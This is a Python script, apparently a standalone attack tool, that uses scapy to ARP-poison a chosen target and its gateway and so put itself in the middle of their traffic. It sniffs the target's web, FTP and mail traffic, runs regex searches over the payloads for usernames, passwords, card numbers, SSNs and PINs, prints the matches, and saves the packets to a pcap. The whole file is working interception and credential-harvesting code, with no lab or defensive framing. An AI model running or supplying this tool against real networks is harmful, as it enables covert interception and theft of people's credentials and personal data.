from scapy.all import *
import time
import logging
from colorama import Fore, Style, init
import ipaddress
import re
init(autoreset=True)

conf.log_suppress = True
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

def validate_ip(ip):
    try:
        ipaddress.ip_address(ip)
        return True
    except ValueError:
        return False

def get_valid_ip(prompt, default):
    while True:
        ip = input(prompt) or default
        if validate_ip(ip):
            return ip
        print(f"{Fore.RED}Invalid IP address. Please try again.{Style.RESET_ALL}")

target_ip = get_valid_ip("Enter your target machine's IP address[192.168.50.200]=> ", "192.168.50.200")
router_ip = get_valid_ip("Enter your gateway's IP address[192.168.50.1]=> ", "192.168.50.1")
my_mac = get_if_hwaddr(conf.iface)

packets = []
pcap_file_name = input("Enter the name of the file that you want to save packets in => ")


def arp_spoof(src, dst,dst_mac):
    packet =ARP(op=2, pdst=dst,psrc=src,hwsrc=my_mac,hwdst=dst_mac) # type: ignore
    send(packet, verbose=False)

def get_mac(ip):
    packet = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip) # type: ignore
    response = srp(packet, timeout=3, verbose=False)[0]
    mac_address = response[0][1].hwsrc
    return mac_address

def reArp():
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(router_ip)
    send(ARP(op = 2, pdst = target_ip, psrc = router_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gateway_mac), count = 7) # type: ignore
    send(ARP(op = 2, pdst = router_ip, psrc = target_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = target_mac), count = 7) # type: ignore

def packet_callback(packet):
    if not packet.haslayer("IP"):
        return
        
    if packet["IP"].src == target_ip:
        # Capture HTTP, HTTPS, FTP, SMTP, and POP3 traffic
        if packet.haslayer("TCP"):
            tcp = packet["TCP"]
            if tcp.dport in [80, 443, 21, 25, 110]:
                packets.append(packet)
                print(f"\n{Fore.CYAN}=================== Packet Information ==================={Style.RESET_ALL}")
                print(f"{Fore.YELLOW}Protocol: {Style.RESET_ALL}{'HTTPS' if tcp.dport == 443 else 'HTTP' if tcp.dport == 80 else 'FTP' if tcp.dport == 21 else 'SMTP' if tcp.dport == 25 else 'POP3'}")
                print(f"{Fore.YELLOW}Source Port: {Style.RESET_ALL}{tcp.sport}")
                print(f"{Fore.YELLOW}Destination Port: {Style.RESET_ALL}{tcp.dport}")
                print(f"{Fore.YELLOW}Source IP: {Style.RESET_ALL}{packet['IP'].src}")
                print(f"{Fore.YELLOW}Destination IP: {Style.RESET_ALL}{packet['IP'].dst}")
                
                if packet.haslayer("Raw"):
                    try:
                        raw_data = packet[Raw].load.decode(errors="ignore")
                        print(f"{Fore.YELLOW}Raw Data: {Style.RESET_ALL}{raw_data[:200]}...")  # Show first 200 chars
                        
                        # Enhanced keyword list for sensitive data
                        keywords = [
                            "user", "username", "usr", "login", "email", "pass", "password", 
                            "pwd", "name", "credit", "card", "ssn", "social", "security",
                            "phone", "address", "dob", "birth", "account", "pin"
                        ]
                        
                        found_sensitive = False
                        for keyword in keywords:
                            matches = re.finditer(rf"({keyword}\w*)\s*[=:]\s*(\S+)", raw_data, re.IGNORECASE)
                            for match in matches:
                                if not found_sensitive:
                                    print(f"{Fore.RED}----------------Sensitive Information Detected----------------{Style.RESET_ALL}")
                                    found_sensitive = True
                                key = match.group(1)
                                value = match.group(2)
                                print(f"{Fore.BLUE}{key}: {Style.RESET_ALL}{value}")
                                print(f"{Fore.YELLOW}Protocol: {Style.RESET_ALL}{'HTTPS' if tcp.dport == 443 else 'HTTP' if tcp.dport == 80 else 'FTP' if tcp.dport == 21 else 'SMTP' if tcp.dport == 25 else 'POP3'}")
                        if found_sensitive:
                            print(f"\n{Fore.GREEN}==================================================={Style.RESET_ALL}\n")
                    except Exception as e:
                        print(f"{Fore.RED}Error processing packet: {str(e)}{Style.RESET_ALL}")
                else:
                    print(f"{Fore.YELLOW}No raw data in packet{Style.RESET_ALL}")
                print(f"{Fore.CYAN}==================================================={Style.RESET_ALL}\n")

def print_banner():
    banner = f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════╗
║                     ARP Poisoning Tool                        ║
║                                                              ║
║  Target IP: {target_ip:<40} ║
║  Gateway IP: {router_ip:<40} ║
║ 
╚══════════════════════════════════════════════════════════╝{Style.RESET_ALL}
"""
    print(banner)

def check_interface():
    try:
        if not conf.iface:
            print(f"{Fore.RED}No network interface specified. Please set one using conf.iface{Style.RESET_ALL}")
            return False
        return True
    except Exception as e:
        print(f"{Fore.RED}Error checking interface: {str(e)}{Style.RESET_ALL}")
        return False

try:
    if not check_interface():
        exit(1)
        
    print_banner()
    print(f"{Fore.YELLOW}Finding MAC addresses...{Style.RESET_ALL}")
    
    try:
        target_mac = get_mac(target_ip)
        gateway_mac = get_mac(router_ip)
    except Exception as e:
        print(f"{Fore.RED}Error getting MAC addresses: {str(e)}{Style.RESET_ALL}")
        exit(1)
        
    time.sleep(0.5)
    print(f"{Fore.GREEN}Done!{Style.RESET_ALL}")
    time.sleep(0.2)
    print(f"{Fore.CYAN}Attacker's MAC: {my_mac} \nTarget's MAC: {target_mac} \nRouter's MAC: {gateway_mac}{Style.RESET_ALL}")
    time.sleep(0.5)
    print(f"{Fore.YELLOW}ARP poisoning is started!{Style.RESET_ALL}")
    time.sleep(1)
    print(f"{Fore.RED}Press Ctrl+C to reARP and quit.{Style.RESET_ALL}")
    print(f"{Fore.GREEN}[*] Listening for packets from {target_ip}...{Style.RESET_ALL}")

    packet_count = 0
    start_time = time.time()

    while True:
        try:
            arp_spoof(src=target_ip, dst=router_ip, dst_mac=gateway_mac)
            arp_spoof(src=router_ip, dst=target_ip, dst_mac=target_mac)
            time.sleep(2)
            packet_count += 1
            
            # Sniff packets in a non-blocking way
            sniff(filter=f"ip src {target_ip}", prn=packet_callback, store=False, timeout=1)
            
            # Print statistics every 10 packets
            if packet_count % 10 == 0:
                elapsed_time = time.time() - start_time
                print(f"\n{Fore.CYAN}Statistics:{Style.RESET_ALL}")
                print(f"Packets sent: {packet_count}")
                print(f"Time elapsed: {elapsed_time:.2f} seconds")
                print(f"Packets per second: {packet_count/elapsed_time:.2f}\n")
                
        except Exception as e:
            print(f"{Fore.RED}Error during ARP spoofing: {str(e)}{Style.RESET_ALL}")
            continue

except KeyboardInterrupt:
    print(f"\n{Fore.YELLOW}Stopping ARP poisoning...{Style.RESET_ALL}")
    reArp()
    print(f"{Fore.GREEN}ARP tables are normal now!{Style.RESET_ALL}")
    
    if packets:
        try:
            wrpcap(f"{pcap_file_name}.pcap", packets)
            print(f"{Fore.GREEN}Packets saved in {pcap_file_name}.pcap{Style.RESET_ALL}")
            print(f"Total packets captured: {len(packets)}")
        except Exception as e:
            print(f"{Fore.RED}Error saving packets: {str(e)}{Style.RESET_ALL}")
    else:
        print(f"{Fore.YELLOW}No packets captured{Style.RESET_ALL}")
        
except Exception as e:
    print(f"{Fore.RED}Unexpected error: {str(e)}{Style.RESET_ALL}")
    exit(1)
        
